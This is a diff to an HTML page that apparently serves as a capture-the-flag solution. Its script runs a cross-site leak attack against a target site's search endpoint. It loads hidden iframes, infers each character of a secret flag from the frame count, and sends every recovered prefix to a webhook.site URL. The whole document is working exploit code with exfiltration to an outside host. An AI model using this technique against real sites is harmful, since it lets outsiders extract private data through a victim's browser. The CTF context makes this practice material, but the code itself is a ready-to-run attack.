@@ -1,13 +1,82 @@
-```html id="g4h5i6"
+```html
 <!doctype html>
 <html>
 <body>
-<h1>Payload Running</h1>
+<h2>Loading...</h2>
 
 <script>
-fetch("https://webhook.site/a0c938c2-b011-4cc8-ad8a-4691d5a93094?test=ok");
-</script>
+const TARGET = "https://wonder.cbd2026.cloud";
+const WEBHOOK = "https://webhook.site/a0c938c2-b011-4cc8-ad8a-4691d5a93094";
+const CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}-!@#$%^&*()";
+let flag = "CBC{";
 
+async function sleep(ms){
+  return new Promise(r => setTimeout(r, ms));
+}
+
+async function testPrefix(prefix){
+  return new Promise((resolve) => {
+    let f = document.createElement("iframe");
+    f.style.display = "none";
+
+    f.onload = async () => {
+      await sleep(1200);
+
+      let ok = false;
+
+      try {
+        // jika hasil pencarian punya iframe preview pdf
+        ok = f.contentWindow.length > 0;
+      } catch(e){
+        ok = false;
+      }
+
+      f.remove();
+      resolve(ok);
+    };
+
+    f.src = TARGET + "/search?q=" + encodeURIComponent(prefix);
+    document.body.appendChild(f);
+  });
+}
+
+async function exfil(data){
+  fetch(WEBHOOK + "?flag=" + encodeURIComponent(data)).catch(()=>{});
+}
+
+async function run(){
+  await exfil("START:" + flag);
+
+  while(!flag.endsWith("}")){
+    let found = false;
+
+    for(let c of CHARS){
+      let guess = flag + c;
+
+      document.body.innerHTML = "<h2>Trying: " + guess + "</h2>";
+
+      let ok = await testPrefix(guess);
+
+      if(ok){
+        flag += c;
+        await exfil(flag);
+        found = true;
+        break;
+      }
+    }
+
+    if(!found){
+      await exfil("FAILED_AT:" + flag);
+      break;
+    }
+  }
+
+  await exfil("DONE:" + flag);
+  document.body.innerHTML = "<h1>" + flag + "</h1>";
+}
+
+run();
+</script>
 </body>
 </html>
 ```
